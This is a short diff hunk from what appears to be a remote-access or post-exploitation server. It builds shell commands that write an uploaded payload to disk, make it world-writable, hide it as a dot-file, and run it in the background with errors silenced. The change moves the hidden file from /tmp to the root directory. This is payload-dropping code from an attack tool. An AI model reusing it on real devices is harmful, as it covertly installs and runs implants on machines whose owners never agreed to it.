@@ -123,8 +123,8 @@ class Server:
             instructions = \
             "cat >/tmp/tmpespl;"+\
             "chmod 777 /tmp/tmpespl;"+\
-            "mv /tmp/tmpespl /tmp/.espl;"+\
-            "/tmp/.espl "+payload_parameter+" 2>/dev/null &\n"
+            "mv /tmp/tmpespl /.espl;"+\
+            "/.espl "+payload_parameter+" 2>/dev/null &\n"
             return (instructions,payload)
         else:
             if device_arch == "Linux":
